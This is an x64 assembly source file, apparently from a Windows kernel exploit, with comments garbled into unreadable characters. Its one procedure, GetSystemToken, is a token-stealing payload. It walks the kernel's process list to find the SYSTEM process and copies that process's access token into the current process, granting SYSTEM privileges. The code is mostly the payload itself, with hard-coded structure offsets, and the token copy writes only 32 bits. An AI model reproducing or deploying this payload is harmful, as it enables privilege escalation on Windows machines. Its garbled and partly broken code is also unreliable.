.DATA		;���ݶ�
.CODE		;�����
GetSystemToken PROC	;���庯������������cpp�ļ�����������һ��


push rax
push rcx
push rdx		;����Ĵ���

xor rax, rax
mov rax, gs: [rax + 188h]; ��ȡ nt!_KPCR.PcrbData.CurrentThread
mov rax, [rax + 070h]; ��ȡ nt!_KTHREAD.ApcState.Process
mov rcx, rax; ��������EPROCESS��ַ���Ƶ�rcx
mov rdx, 4; 

SearchSystemPID:
	mov rax, [rax + 0188h]; ��ȡ nt!_EPROCESS.ActiveProcessLinks.Flink
	sub rax, 0188h
	cmp [rax + 0180h], rdx; ��ȡ nt!_EPROCESS.UniqueProcessId
	jne SearchSystemPID; ѭ������Ƿ���SYSTEM����PID

mov rdx, [rax + 0208h]; ��ȡSystem���̵�Token
mov[rcx + 0208h], edx; ��������Token�滻ΪSYSTEM���� nt!_EPROCESS.Token

pop rdx			;�ָ��Ĵ���
pop rcx
pop rax


add rsp, 40			; �ָ���ջ
xor rax, rax		; ����״̬ SUCCEESS
ret ;`
GetSystemToken ENDP;
END